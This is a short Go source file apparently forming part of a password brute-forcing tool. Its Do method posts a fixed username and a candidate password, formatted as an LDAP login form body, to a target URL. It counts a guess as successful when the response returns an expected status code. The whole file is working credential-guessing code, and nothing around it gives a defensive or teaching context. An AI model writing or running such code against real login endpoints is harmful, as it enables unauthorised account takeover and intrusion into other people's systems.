package main

import (
	"fmt"
	"strings"

	"github.com/valyala/fasthttp"
)

type NetFastBruteImpl struct {
	URL                string
	Method             string
	Username           string
	ExpectedStatusCode int
	Headers            map[string]string // "User-Agent": "Firefox"
}

func NewFastBruteImpl(method, url, username string, expectedStatusCode int, headers map[string]string) *NetFastBruteImpl {
	return &NetFastBruteImpl{
		Method:             strings.ToUpper(method),
		URL:                url,
		Username:           username,
		ExpectedStatusCode: expectedStatusCode,
		Headers:            headers,
	}
}

func (c *NetFastBruteImpl) Do(password string) (bool, error) {
	payload := fmt.Sprintf(`1_ldap-username=%s&1_ldap-secret=%s&0=[{},"$K1"]`, c.Username, password)

	req := fasthttp.AcquireRequest()
	defer fasthttp.ReleaseRequest(req)

	resp := fasthttp.AcquireResponse()
	defer fasthttp.ReleaseResponse(resp)

	req.SetRequestURI(c.URL)
	req.Header.SetMethod(c.Method)
	req.SetBodyString(payload)

	for k, v := range c.Headers {
		req.Header.Set(k, v)
	}

	client := &fasthttp.Client{}

	err := client.Do(req, resp)
	if err != nil {
		return false, err
	}

	return resp.StatusCode() == c.ExpectedStatusCode, nil
}
